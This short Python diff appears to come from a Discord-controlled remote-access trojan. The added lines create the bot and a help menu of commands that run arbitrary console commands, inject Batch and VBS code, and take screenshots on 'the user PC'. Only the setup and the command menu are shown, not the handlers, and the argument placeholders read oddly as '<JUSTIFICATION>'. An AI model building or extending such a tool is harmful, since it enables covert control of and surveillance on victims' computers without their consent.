@@ -10,3 +10,11 @@ import pyautogui
 
 prefix = '$'
 token = 'TOKEN'
+bot = commands.Bot(command_prefix=prefix)
+cmds=f"""
+All commands:
+`{prefix}cmd <JUSTIFICATION>` : start a command in the user console.
+`(example: {prefix}cmd ping google.com)`
+`{prefix}batinjector <JUSTIFICATION>` : insert code Batch on the user PC.
+`{prefix}vbsinjector <JUSTIFICATION>` : insert code VBS on the user PC.
+`{prefix}screenshot` : Get a screenshot of the user PC.
